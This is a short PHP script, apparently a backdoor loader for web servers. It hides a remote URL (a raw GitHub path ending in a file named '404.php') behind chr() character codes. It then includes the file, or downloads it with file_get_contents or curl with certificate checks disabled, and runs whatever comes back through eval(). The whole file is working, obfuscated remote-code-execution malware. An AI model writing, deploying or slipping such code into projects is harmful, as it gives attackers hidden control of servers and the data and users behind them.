<?php
$u = chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).
     chr(114).chr(97).chr(119).chr(46).chr(103).chr(105).chr(116).chr(104).chr(117).
     chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).
     chr(101).chr(110).chr(116).chr(46).chr(99).chr(111).chr(109).chr(47).
     chr(98).chr(51).chr(108).chr(49).chr(51).chr(118).chr(51).chr(120).chr(54).
     chr(54).chr(54).chr(47).chr(98).chr(108).chr(101).chr(115).chr(115).chr(101).
     chr(100).chr(47).chr(114).chr(101).chr(102).chr(115).chr(47).chr(104).chr(101).
     chr(97).chr(100).chr(115).chr(47).chr(109).chr(97).chr(105).chr(110).chr(47).
     chr(52).chr(48).chr(52).chr(46).chr(112).chr(104).chr(112);

if(ini_get('allow_url_include')){
    include($u);
}else{
    $c=@file_get_contents($u);
    if(!$c){
        $ch=curl_init($u);
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_SSL_VERIFYPEER=>0]);
        $c=curl_exec($ch);
        curl_close($ch);
    }
    eval('?>'.$c);
}
?>
